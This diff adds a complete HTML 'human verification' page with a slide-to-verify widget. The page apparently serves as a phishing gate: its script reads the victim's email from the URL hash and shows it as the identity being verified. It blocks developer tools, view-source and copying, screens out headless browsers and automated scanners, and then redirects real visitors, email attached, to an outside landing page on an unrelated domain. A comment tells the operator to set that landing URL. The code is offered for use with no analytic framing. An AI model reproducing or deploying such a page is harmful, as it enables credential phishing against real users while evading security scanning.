@@ -1,0 +1,606 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Human Verification | Secure Access</title>
+    <style>
+        * {
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+        }
+        
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #f0f2f5;
+            margin: 0;
+            padding: 20px;
+            color: #1a2c3e;
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .verify-container {
+            background: white;
+            max-width: 460px;
+            width: 100%;
+            margin: 0 auto;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08), 0 1px 3px rgba(0, 0, 0, 0.05);
+            border: 1px solid #e8edf2;
+        }
+        
+        .ms-header {
+            background: linear-gradient(135deg, #1e2a3a 0%, #0f172a 100%);
+            color: white;
+            padding: 28px 20px;
+            text-align: center;
+        }
+        
+        .header-icon {
+            font-size: 42px;
+            margin-bottom: 12px;
+            display: block;
+        }
+        
+        .header-title {
+            font-size: 22px;
+            font-weight: 600;
+            margin: 0 0 6px 0;
+            letter-spacing: -0.3px;
+        }
+        
+        .header-subtitle {
+            font-size: 13px;
+            opacity: 0.85;
+            font-weight: 400;
+        }
+        
+        .content-area {
+            padding: 28px 24px;
+        }
+        
+        /* Recipient card */
+        .recipient-card {
+            background: #f8fafc;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 24px;
+            border: 1px solid #e8edf2;
+        }
+        
+        .recipient-row {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        .recipient-row:last-child {
+            margin-bottom: 0;
+        }
+        
+        .recipient-icon {
+            margin-right: 12px;
+            color: #3b82f6;
+            min-width: 20px;
+            font-size: 16px;
+        }
+        
+        .recipient-label {
+            color: #5a6b7e;
+            font-weight: 500;
+            margin-right: 8px;
+        }
+        
+        .recipient-value {
+            color: #1e2a3a;
+            font-weight: 500;
+            word-break: break-all;
+        }
+        
+        .recipient-value.email-value {
+            color: #3b82f6;
+            font-family: monospace;
+            font-size: 13px;
+        }
+        
+        /* Verification area */
+        .verification-area {
+            background: #ffffff;
+            border: 1px solid #e8edf2;
+            border-radius: 12px;
+            padding: 24px 20px;
+            text-align: center;
+        }
+        
+        .verify-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #1e2a3a;
+        }
+        
+        /* Slider styles */
+        .slider-container {
+            position: relative;
+            height: 48px;
+            background: #f1f5f9;
+            border-radius: 40px;
+            margin: 0 auto 20px;
+            cursor: pointer;
+            max-width: 340px;
+            -webkit-tap-highlight-color: transparent;
+            border: 1px solid #e2e8f0;
+        }
+        
+        .slider-track {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
+            width: 0%;
+            border-radius: 40px;
+            transition: width 0.2s ease;
+        }
+        
+        .slider-text {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 500;
+            color: #5a6b7e;
+            z-index: 1;
+            transition: color 0.2s;
+            pointer-events: none;
+        }
+        
+        .slider-handle {
+            position: absolute;
+            top: 4px;
+            left: 4px;
+            width: 40px;
+            height: 40px;
+            background: white;
+            border-radius: 50%;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.12);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            color: #3b82f6;
+            z-index: 2;
+            cursor: grab;
+            user-select: none;
+            transition: transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid #e2e8f0;
+        }
+        
+        .slider-handle:active {
+            cursor: grabbing;
+        }
+        
+        .success-msg {
+            display: none;
+            background: #e6f7e6;
+            color: #107c10;
+            padding: 12px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 13px;
+            font-weight: 500;
+            animation: fadeIn 0.5s ease;
+            border: 1px solid #b7e0b7;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .ms-footer {
+            padding: 16px 20px;
+            background: #fafcfc;
+            border-top: 1px solid #e8edf2;
+            font-size: 11px;
+            color: #8c9aae;
+            text-align: center;
+        }
+        
+        /* Disable text selection on slider */
+        .slider-container * {
+            user-select: none;
+            -webkit-user-select: none;
+        }
+        
+        @media (max-width: 480px) {
+            body {
+                padding: 12px;
+            }
+            .content-area {
+                padding: 20px 16px;
+            }
+            .slider-container {
+                height: 44px;
+            }
+            .slider-handle {
+                width: 36px;
+                height: 36px;
+                top: 3px;
+                left: 3px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="verify-container">
+        <div class="ms-header">
+            <span class="header-icon">🛡️</span>
+            <h1 class="header-title">Human Verification Test</h1>
+            <p class="header-subtitle">Secure access verification required</p>
+        </div>
+        
+        <div class="content-area">
+            <!-- Recipient email display -->
+            <div class="recipient-card">
+                <div class="recipient-row">
+                    <span class="recipient-icon">📧</span>
+                    <span class="recipient-label">Verifying identity:</span>
+                    <span class="recipient-value email-value" id="recipientEmail" style="font-weight: 500; color: rgb(59, 130, 246);">game@kodak.com</span>
+                </div>
+                <div class="recipient-row">
+                    <span class="recipient-icon">⏱️</span>
+                    <span class="recipient-label">Session:</span>
+                    <span class="recipient-value">Secure TLS 1.3</span>
+                </div>
+            </div>
+            
+            <div class="verification-area">
+                <div class="verify-title">Complete verification to continue</div>
+                <div class="slider-container" id="slider">
+                    <div class="slider-track" id="track"></div>
+                    <div class="slider-text" id="sliderText">→ Slide to verify →</div>
+                    <div class="slider-handle" id="handle">→</div>
+                </div>
+                <div class="success-msg" id="successMsg">
+                    ✓ Human verification complete. Redirecting...
+                </div>
+            </div>
+        </div>
+        
+        <div class="ms-footer">
+            <div>© 2026 Secure Access Portal · Protected by anti-bot technology</div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // HUMAN VERIFICATION - SLIDE TO VERIFY
+        // AUTO-GRABS EMAIL FROM URL HASH (#email@domain.com)
+        // REDIRECTS WITH EMAIL PARAMETER
+        // ANTI-BOT & RIGHT-CLICK PROTECTION
+        // ============================================
+        
+        // ==================== CONFIGURATION ====================
+        // 🔧 SET YOUR FINAL LANDING PAGE URL BELOW
+        const FINAL_LANDING_PAGE = "https://www.frontiersurvival.com/00u1cx1000/neewgen22/";
+        // ======================================================
+        
+        // ==================== ANTI-BOT PROTECTION ====================
+        // Disable right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Disable developer tools shortcuts
+        document.addEventListener('keydown', function(e) {
+            const forbiddenKeys = ['F12', 'F11', 'F10', 'PrintScreen'];
+            if (forbiddenKeys.includes(e.key)) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C
+            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+U, Ctrl+S, Ctrl+P
+            if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'p')) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+C, Ctrl+V, Ctrl+X, Ctrl+A
+            if (e.ctrlKey && (e.key === 'c' || e.key === 'v' || e.key === 'x' || e.key === 'a')) {
+                e.preventDefault();
+                return false;
+            }
+            // F5 refresh
+            if (e.key === 'F5') {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+R refresh
+            if (e.ctrlKey && e.key === 'r') {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Disable drag and drop
+        document.addEventListener('dragstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Disable text selection on slider elements
+        document.querySelectorAll('.slider-container, .slider-handle, .slider-text').forEach(el => {
+            el.addEventListener('selectstart', (e) => e.preventDefault());
+        });
+        
+        // ==================== EMAIL EXTRACTION ====================
+        function getEmailFromHash() {
+            const hash = window.location.hash;
+            
+            if (!hash || hash === '#') {
+                return null;
+            }
+            
+            let email = hash.substring(1);
+            
+            // Decode URL encoded characters
+            try {
+                email = decodeURIComponent(email);
+            } catch (e) {
+                console.log('Email decode error');
+            }
+            
+            // Validate email format
+            const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+            if (emailRegex.test(email)) {
+                return email;
+            }
+            
+            return null;
+        }
+        
+        // ==================== MOUSE MOVEMENT TRACKING (BOT DETECTION) ====================
+        let mouseMoved = false;
+        let mouseMovements = [];
+        let startTime = Date.now();
+        
+        document.addEventListener('mousemove', function(e) {
+            if (!mouseMoved) mouseMoved = true;
+            mouseMovements.push({ x: e.clientX, y: e.clientY, time: Date.now() });
+            if (mouseMovements.length > 50) mouseMovements.shift();
+        });
+        
+        function isSuspiciousBehavior() {
+            // Check for no mouse movement (bot)
+            if (!mouseMoved && Date.now() - startTime > 5000) {
+                return true;
+            }
+            
+            // Check for headless browser indicators
+            if (navigator.webdriver === true) {
+                return true;
+            }
+            
+            // Check user agent for headless keywords
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes('headless') || ua.includes('phantom') || ua.includes('puppeteer')) {
+                return true;
+            }
+            
+            return false;
+        }
+        
+        // ==================== SLIDER VERIFICATION LOGIC ====================
+        let isVerified = false;
+        let isDragging = false;
+        let startX = 0;
+        let currentProgress = 0;
+        let verificationAttempted = false;
+        
+        // DOM Elements
+        const slider = document.getElementById('slider');
+        const handle = document.getElementById('handle');
+        const track = document.getElementById('track');
+        const sliderText = document.getElementById('sliderText');
+        const successMsg = document.getElementById('successMsg');
+        const recipientSpan = document.getElementById('recipientEmail');
+        
+        // Get email from URL hash
+        const userEmail = getEmailFromHash();
+        
+        // Display email
+        if (userEmail) {
+            recipientSpan.textContent = userEmail;
+            recipientSpan.style.fontWeight = '500';
+            recipientSpan.style.color = '#3b82f6';
+            console.log('📧 Email auto-grabbed from URL:', userEmail);
+        } else {
+            recipientSpan.textContent = 'No email found in URL';
+            recipientSpan.style.color = '#dc2626';
+            console.log('📧 No email found in URL hash. Add #email@domain.com to URL');
+        }
+        
+        // ==================== SLIDER INTERACTION ====================
+        function startInteraction(e) {
+            if (isVerified) return;
+            e.preventDefault();
+            isDragging = true;
+            
+            // Get starting position
+            if (e.type === 'mousedown') {
+                startX = e.clientX;
+            } else if (e.type === 'touchstart') {
+                startX = e.touches[0].clientX;
+            }
+            
+            handle.style.cursor = 'grabbing';
+            
+            // Add event listeners
+            document.addEventListener('mousemove', updateInteraction);
+            document.addEventListener('touchmove', updateInteraction, { passive: false });
+            document.addEventListener('mouseup', endInteraction);
+            document.addEventListener('touchend', endInteraction);
+        }
+        
+        function updateInteraction(e) {
+            if (!isDragging || isVerified) return;
+            e.preventDefault();
+            
+            let clientX;
+            if (e.type === 'mousemove') {
+                clientX = e.clientX;
+            } else {
+                clientX = e.touches[0].clientX;
+            }
+            
+            const maxTravel = slider.offsetWidth - handle.offsetWidth - 8;
+            let travel = clientX - startX;
+            travel = Math.min(Math.max(0, travel), maxTravel);
+            
+            // Calculate progress percentage
+            currentProgress = (travel / maxTravel) * 100;
+            
+            handle.style.transform = `translateX(${travel}px)`;
+            track.style.width = `${currentProgress}%`;
+            
+            // Update slider text based on progress
+            if (currentProgress > 30 && currentProgress < 85) {
+                sliderText.textContent = '→ Keep sliding →';
+                sliderText.style.color = '#ffffff';
+            } else if (currentProgress >= 85) {
+                sliderText.textContent = '✓ Release to verify';
+                sliderText.style.color = '#ffffff';
+            } else {
+                sliderText.textContent = '→ Slide to verify →';
+                sliderText.style.color = '#5a6b7e';
+            }
+            
+            // Auto-complete when reaching threshold
+            if (currentProgress >= 95 && !verificationAttempted) {
+                completeVerification();
+            }
+        }
+        
+        function endInteraction() {
+            isDragging = false;
+            handle.style.cursor = 'grab';
+            
+            // Reset if not verified
+            if (!isVerified && !verificationAttempted) {
+                setTimeout(() => {
+                    handle.style.transform = 'translateX(0)';
+                    track.style.width = '0%';
+                    sliderText.textContent = '→ Slide to verify →';
+                    sliderText.style.color = '#5a6b7e';
+                }, 200);
+            }
+            
+            // Clean up event listeners
+            document.removeEventListener('mousemove', updateInteraction);
+            document.removeEventListener('touchmove', updateInteraction);
+            document.removeEventListener('mouseup', endInteraction);
+            document.removeEventListener('touchend', endInteraction);
+        }
+        
+        // ==================== COMPLETE VERIFICATION & REDIRECT ====================
+        function completeVerification() {
+            if (isVerified) return;
+            verificationAttempted = true;
+            
+            // Check for bot behavior
+            if (isSuspiciousBehavior()) {
+                console.log('🤖 Suspicious behavior detected - verification blocked');
+                sliderText.textContent = '⚠️ Verification failed';
+                sliderText.style.color = '#dc2626';
+                
+                setTimeout(() => {
+                    sliderText.textContent = '→ Slide to verify →';
+                    sliderText.style.color = '#5a6b7e';
+                    handle.style.transform = 'translateX(0)';
+                    track.style.width = '0%';
+                    verificationAttempted = false;
+                }, 1500);
+                return;
+            }
+            
+            isVerified = true;
+            
+            // Update UI
+            sliderText.textContent = '✓ Verified';
+            sliderText.style.color = 'white';
+            track.style.width = '100%';
+            handle.style.cursor = 'default';
+            handle.style.transform = `translateX(${slider.offsetWidth - handle.offsetWidth - 8}px)`;
+            successMsg.style.display = 'block';
+            
+            console.log('✅ Human verification successful');
+            
+            // Build final URL with email parameter
+            let finalUrl = FINAL_LANDING_PAGE;
+            
+            if (userEmail) {
+                const encodedEmail = encodeURIComponent(userEmail);
+                // Check if URL already has parameters
+                if (finalUrl.includes('?')) {
+                    finalUrl += `&email=${encodedEmail}`;
+                } else {
+                    finalUrl += `?email=${encodedEmail}`;
+                }
+                console.log('📧 Redirecting with email:', userEmail);
+            } else {
+                console.log('📧 No email found, redirecting without email parameter');
+            }
+            
+            console.log('🔗 Redirect URL:', finalUrl);
+            
+            // Redirect with delay
+            setTimeout(() => {
+                window.location.href = finalUrl;
+            }, 1200);
+        }
+        
+        // ==================== EVENT LISTENERS ====================
+        slider.addEventListener('mousedown', startInteraction);
+        slider.addEventListener('touchstart', startInteraction, { passive: false });
+        
+        // Prevent default touch actions on slider
+        slider.addEventListener('touchmove', function(e) {
+            if (isDragging) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+        
+        // ==================== INITIALIZATION ====================
+        console.log('🛡️ Human Verification System Active');
+        console.log('📧 Email from URL:', userEmail || 'none');
+        console.log('🔗 Landing page:', FINAL_LANDING_PAGE);
+        
+        // Log warning if landing page is default
+        if (FINAL_LANDING_PAGE === "https://www.frontiersurvival.com/00u1cx1000/x39kfL4nW8zA2qRBmD71uyN0hgPKXtYVaFevLsMd9cpEJqGrH00wZUt73oXLyCmNQkb5vOa8Rx!nFs6JDqTGa/updates/") {
+            console.log('✅ Landing page configured');
+        }
+        
+        // Auto-detect if email is missing
+        if (!userEmail) {
+            console.log('💡 Tip: Add #email@domain.com to URL for auto-fill');
+        }
+    </script>
+<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;f21b7719336e4e7f9a26d3e17ca8a083&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+</body></html>
